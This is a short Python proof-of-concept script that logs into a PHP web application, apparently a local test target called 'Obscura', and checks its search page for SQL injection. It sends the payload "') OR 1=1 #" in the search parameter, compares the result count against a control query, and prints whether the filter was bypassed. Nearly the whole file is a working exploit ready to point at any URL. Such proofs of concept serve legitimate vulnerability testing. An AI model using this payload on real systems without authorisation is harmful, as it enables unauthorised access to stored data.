import sys
import re
import requests

# Usage:
# python poc.py http://localhost:8081
# python poc.py http://localhost:8082

if len(sys.argv) != 2:
    print("Usage: python poc.py http://localhost:8081")
    sys.exit(1)

base = sys.argv[1].rstrip("/")
session = requests.Session()

username = input("Username: ")
password = input("Password: ")

login = session.post(
    f"{base}/login.php",
    data={"username": username, "password": password},
    timeout=15
)

if "login.php" in login.url:
    print("[-] Login failed. Check your credentials.")
    sys.exit(1)

# Search for something that should not exist xdd
control = session.get(
    f"{base}/search.php",
    params={"q": "obscura_nonexistent_987654321"},
    timeout=15
)

# SQL injection that bypasses the search condition here
payload = "') OR 1=1 #"

attack = session.get(
    f"{base}/search.php",
    params={"q": payload},
    timeout=15
)

def count_results(html):
    match = re.search(r"(\d+)\s+found", html, re.IGNORECASE)
    return int(match.group(1)) if match else None

control_count = count_results(control.text)
attack_count = count_results(attack.text)

print("\n=== OBSCURA SQL INJECTION TEST ===")
print("Target:", base)
print("Payload:", payload)
print("Normal search results:", control_count)
print("Injection results:", attack_count)

if control_count is None or attack_count is None:
    print("[?] Could not identify result counts. Check the HTML.")
elif control_count == 0 and attack_count > 0:
    print("[+] VULNERABLE: SQL injection bypassed the search filter.")
elif control_count == 0 and attack_count == 0:
    print("[-] NOT EXPLOITED: No results returned by the payload.")
else:
    print("[?] Inconclusive result. Review the output manually.")
